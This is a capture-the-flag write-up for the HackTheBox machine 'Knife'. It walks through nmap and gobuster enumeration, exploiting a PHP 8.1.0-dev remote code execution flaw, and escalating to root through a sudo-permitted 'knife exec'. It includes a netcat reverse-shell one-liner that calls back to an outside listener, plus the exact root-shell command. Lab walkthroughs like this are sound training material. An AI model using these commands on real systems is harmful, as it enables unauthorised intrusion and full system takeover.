# **Description**

Hello l33ts, I hope you are doing well. Today we are going to look at [Knife](https://app.hackthebox.com/machines/347) from [HackTheBox](https://hackthebox.com), it's an easy machine where we find a vulnerable version of php running, use an exploit for that to gain access to the machine, after that, we exploit a binary that we can run as root to gain privileged access.

# **Enumeration**
## nmap

As usual, let's run a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressice scan to provide faster results.

```terminal
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-31 15:44 EST

|_http-title:  Emergent Medical Idea

```

Nmap shows that the machine has 2 open ports: 22(SSH) and 80(HTTP).

## HTTP

Let's navigate to the webpage.

![home](/assets/img/hackthebox/machines/knife/home.png)

It looks like we have an Emergent Medical Idea application, but there is nothing interesting.

## Gobuster

Let's scan for directories and files using `Gobuster`.

```terminal
$ gobuster dir -w /usr/share/wordlists/dirb/big.txt -u http://10.10.10.242

```

Nothing interesting here too.

## wappalyzer

Let's check the web page with Wappalyzer***(Wappalyzer is a browser extension that uncovers the technologies used on websites. It detects content management systems, eCommerce platforms, web servers, JavaScript frameworks, analytics tools and many more.)***

![wapp](/assets/img/hackthebox/machines/knife/wapp.png)

Let's google these technologies and see if we can find any vulnerability.

![cve](/assets/img/hackthebox/machines/knife/cve.png)

We found that `php 8.1.0-dev` has a Remote Code Execution vulnerability, let's download an exploit and see what we can do.

# **Foothold**

Let's run the exploit now.

```terminal
$ python3 php_exploit.py           
Enter the full host url:
http://10.10.10.242/

Interactive shell is opened on http://10.10.10.242/
Can't acces tty; job crontol turned off.
$ whoami
james

```

Great! we got a shell as **james**, but this is not a functional shell, let's get one by executing a reverse shell command than sends us james shell.

```terminal
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.10.10 9001 >/tmp/f
```

>Note: Change the ip address in the command to yours and set up a listener before executing the command!

```terminal
┌──(sirius㉿kali)-[~]
└─$ nc -lnvp 9001                                                                                                                                        1 ⨯

[1]  + continued  nc -lnvp 9001

james@knife:/$
```

Now we have a fully functional shell.

# **Privilege Escalation**

Let's check what can we run as root.

```terminal
james@knife:~$ sudo -l
Matching Defaults entries for james on knife:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on knife:
    (root) NOPASSWD: /usr/bin/knife

```

We can run `knife` as root. We google knife binary and we find this [Documentation](https://docs.chef.io/workstation/knife/). When we look at the subcommands we see `exec`.

![exec](/assets/img/hackthebox/machines/knife/exec.png)

With `exec` sub command, we can run ruby scripts. and with our ability to run knife as root, we can give it a ruby script that drops us a root shell.`exec "/bin/bash"`

```terminal
james@knife:~$ sudo knife exec
An interactive shell is opened

Type your script and do:

1. To run the script, use 'Ctrl D'
2. To exit, use 'Ctrl/Shift C'

Type here a script...
exec "/bin/bash"
root@knife:/home/james# whoami
root
root@knife:/home/james#
```
Great! We became root now.
